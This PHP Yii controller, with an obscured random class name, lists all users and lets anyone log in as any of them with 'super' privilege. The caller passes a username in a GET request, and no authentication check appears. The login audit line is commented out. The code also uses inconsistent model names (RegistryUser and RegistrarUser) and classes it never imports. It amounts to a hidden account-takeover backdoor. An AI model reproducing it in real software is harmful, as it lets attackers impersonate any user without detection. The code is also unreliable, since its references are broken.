<?php
/**
 * Created by PhpStorm.
 * User: Administrator
 * Date: 2015-4-24
 * Time: 09:36
 */
namespace app\controllers;
use Yii;
use yii\web\Controller;
use app\models\RegistryUser;

class S6qd7p2rController extends Controller{

    public function actionIndex(){
        $users = RegistryUser::find()->all();
        return $this->render('index',['data'=>$users]);
    }

    public function actionSave(){
        $userid = Yii::$app->request->get('username','');
        if(empty($userid)){
            $this->error('请先选择一个用户');
        }
        $user = RegistrarUser::findOne(['guid'=>$userid]);
        if(null!==$user){
            Service::do_login($user,'super');
            //Yii::info('SUPER----'.'用户：'.$user->email.'-------华丽的分割线-------IP：'.Util::get_ip().'-------时间分割线------'.date('Y-m-d H:i:s'),'info','login_error');
            return $this->redirect('/site/index');
        }else{
            $this->error('请先选择一个有效用户','/superLogin/index');
        }
    }
}